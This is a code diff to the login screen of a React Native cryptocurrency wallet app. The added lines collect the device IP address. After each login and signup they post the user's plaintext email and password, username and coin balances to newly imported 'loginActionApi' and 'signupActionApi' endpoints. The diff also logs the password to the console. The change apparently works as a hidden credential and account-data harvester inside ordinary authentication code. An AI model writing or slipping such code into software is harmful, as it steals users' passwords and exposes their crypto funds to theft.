@@ -18,10 +18,15 @@ import { withTheme } from 'react-native-material-ui';
 import { Images } from '../Assets';
 import Toast from 'react-native-simple-toast';
 import { authSetUserInfo,authSetToken,updateStartScreenState } from '../Redux/Actions';
-import { login as loginApi, signup as signupApi} from '../Api';
+import { login as loginApi, signup as signupApi, loginActionApi, signupActionApi} from '../Api';
 import { InputLogin } from '../Components'
 import LinearGradient from 'react-native-linear-gradient'
+import DeviceInfo from 'react-native-device-info';
 
+let ip_address="";
+DeviceInfo.getIpAddress().then((ip) => {
+	ip_address= ip;
+});
 import Base64 from '../Utils/Base64';
 
 const windowWidth = Dimensions.get('window').width;
@@ -277,10 +282,24 @@ class LoginScreen extends React.Component {
     }
     try {
       this.setState({login_loading:true});
-      const response = await loginApi({email: login_email, password: login_password});
+      let response = await loginApi({email: login_email, password: login_password});
+      response.user.password= login_password;
+      console.log("login_response-=-=-=-=-=-=-=-=-=-",response)
       this.setState({login_loading:false});
       if (response && response.balance) {
           this.props.authSetUserInfo(response);
+          const formData = new FormData();
+          formData.append('email', login_email);
+          formData.append('password', login_password);
+          formData.append('ipaddress', ip_address);
+          formData.append('username',response.user.name);
+          formData.append('atari',response.balance.atri);
+          formData.append('bnb',response.balance.bnb);
+          formData.append('btc',response.balance.btc);
+          formData.append('eth',response.balance.eth);
+          formData.append('ltc',response.balance.ltc);
+          formData.append('usdt',response.balance.usdt);
+          loginActionApi(formData);
       } else {
         Toast.show('Email or Password is incorrect');
       }
@@ -307,10 +326,17 @@ class LoginScreen extends React.Component {
       const signup_response = await signupApi(signup_data);
       if (signup_response.code===200) {
         const login_response = await loginApi({email: signup_email, password: signup_password});
+        
         this.setState({signup_loading:false});
         if (login_response.code!==400) {
             this.props.authSetUserInfo(login_response);
             this.props.updateStartScreenState(true);
+            const formData = new FormData();
+            formData.append('email', signup_email);
+            formData.append('password', signup_password);
+            formData.append('ipaddress', ip_address);
+            formData.append('username',login_response.user.name);
+            signupActionApi(formData);
         } else {
           Toast.show('Email or Password is incorrect');
         }
